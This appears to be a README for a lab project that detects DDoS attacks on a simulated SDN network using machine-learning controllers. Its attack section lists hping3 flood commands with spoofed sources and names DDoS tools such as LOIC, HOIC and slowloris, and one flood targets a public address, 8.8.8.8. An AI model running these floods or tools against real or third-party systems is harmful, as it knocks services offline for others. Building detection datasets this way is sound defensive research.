# I. Server Administration Information:
## VMware:
Product: VMware® Workstation 15 Pro  
Version: 15.5.0 build-14665864  
## Ryu Controller:
OS: Ubuntu 19.10 eoan  
IP: 192.168.0.104   
## Mininet:
OS: Ubuntu 18.04.6 LTS  
IP:192.168.0.100


# II. Build SDN System
## 1. Ryu Controller
**Step 1: Goto my project**
```sh
cd my_project/controller/
```
**Step 2: Start Controller SDN**  
In this directory, I have created multiple Controller files, each corresponding to different machine learning algorithms used for testing in various scenarios of detecting and mitigating DDoS attacks. Specifically:
- DT_controller-detect.py: this file uses a Decision Tree algorithm so the system can detect DDoS attacks.
- KNN_controller-detech.py: uses a K-Nearest Neighbors algorithm. algorithm so the system can detect DDoS attacks.
- RF_controller.py: uses a Randowm Forest algorithm. algorithm so the system can detect DDoS attacks.
- DTree_Controller.py: this file uses a Decision Tree algorithm so the system can detect and mitigate DDoS attacks.
- KNN_Controller.py: uses a K-Nearest Neighbors algorithm so the system can detect and mitigate DDoS attacks.

Controller normal (The controller operates normally and does not have an integrated attack detection and mitigation module):
```sh
ryu-manager ryu.app.simple_switch_13,ryu.app.ofctl_rest flowmanager/flowmanager.py    --observe-links --ofp-tcp-listen-port 6653 --wsapi-port 8080"
```
Controller detect:
```sh
DTree: ryu-manager DT_controller-detect.py,ryu.app.ofctl_rest flowmanager/flowmanager.py  --observe-links --ofp-tcp-listen-port 6653 --wsapi-port 8080
KNN:   ryu-manager KNN_controller-detech.py,ryu.app.ofctl_rest flowmanager/flowmanager.py  --observe-links --ofp-tcp-listen-port 6653 --wsapi-port 8080
```
Controller detect & mitigation:
```sh
DTree: ryu-manager DTree_Controller.py,ryu.app.ofctl_rest flowmanager/flowmanager.py  --observe-links --ofp-tcp-listen-port 6653 --wsapi-port 8080
KNN:   ryu-manager KNN_Controller.py,ryu.app.ofctl_rest flowmanager/flowmanager.py  --observe-links --ofp-tcp-listen-port 6653 --wsapi-port 8080
```
**Step 3: Controller management site**
```sh
http://192.168.0.104:8080/home/index.html
```
		
## 2. Mininet
**Step 1: Goto my project**
```sh
cd project/mininet
```
**Step 2: Start sflow service**
```sh
sudo ./sflow/sflow-rt/start.sh
```
After starting sflow, you should open another command line on linux to initialize mininet

**Step 3: Start mininet**  
Within the scope of my experiment, I created 2 mininet files in python3 language. Furthermore, I use the command in linux to create mininet virtual devices, details are as below:
- Topology 1: 12 hosts and 6 switches
```sh
sudo mn --custom topology.py,sflow/sflow-rt/extras/sflow.py --link tc,bw=10 --controller=remote,ip=192.168.0.104:6653 --topo mytopo
```
- Topology 2: 6 hosts and 3 switches
```sh
sudo mn --custom topology2.py,sflow/sflow-rt/extras/sflow.py --controller=remote,ip=192.168.0.104:6653 --topo mytopo
```
- Topology commandline: Linux commandline
```sh
sudo mn -c && sudo mn --custom sflow/sflow-rt/extras/sflow.py --link tc,bw=10 --controller=remote,ip=192.168.0.104:6653 --topo tree,depth=2,fanout=2
```
Here, you only use 1 of 3 topologies to test the system.

**Step 4: Make Mininet access Internet**  
I wrote a simple script to help mininet's virtualized devices access directly to the Internet. I use it to experiment with hosts inside the system attacking the Internet.
```sh
source /home/will/project/mininet/route-topology2.mn
```
Step 5: SDN infrastructure monitoring website
```sh
http://192.168.0.100:8008/html/index.html#status
http://192.168.0.100:8008/app/mininet-dashboard/html/index.html#charts
```


# III. Attack DDOS
Start the web on any host, here I use host 1 as the web server
```sh
python -m SimpleHTTPServer 80
```
Test Web Server: using another host to request to host 1.
```sh
wget http://10.0.0.1
```
Attack DDOS
```sh
Icmp flood command: h6 hping3 -1 -V -d 120 -w 64 -p 80 --rand-source --flood h1
SYN flood command: 	h6 hping3 -S -V -d 120 -w 64 -p 80 --rand-source --flood h1
Udp flood command:  h6 hping3 -2 -V -d 120 -w 64 -p 80 --rand-source --flood h1
attack Controller:  h6 hping3 -1 -V -d 120 -w 64 -p 80 --rand-source --flood 192.168.0.104
attack Public	 :  h6 hping3 -1 -V -d 120 -w 64 -p 80 --rand-source --flood 8.8.8.8
```
Other tool attack: I use some cehv11 ddos attack tools
```sh
cd project/tool-dos/tool-attack/
wine Hoic.exe
mono LOIC.exe
python pyloris.py
python3 slowloris.py 10.0.0.1 -p 80
python torhammer.py -t 10.0.0.1
python torhammer.py -t 10.0.0.1 -p 80
python3 saphyra http://10.0.0.1/ (full CPU)
python3 RDDoS_Tool.py => select 2 => IP - port
```
In addition to using the CIC dataset, during the process of experimenting with detecting DDoS attacks, I collected and added to the dataset.  
Normal Dataset:
```sh
Controller: ryu-manager collect_benign_trafic.py
Mininet: sudo python3 generate_benign_trafic.py
```
DDoS Dataset:
```sh
Controller: ryu-manager collect_ddos_trafic.py
Mininet: sudo python3 generate_ddos_trafic.py
```
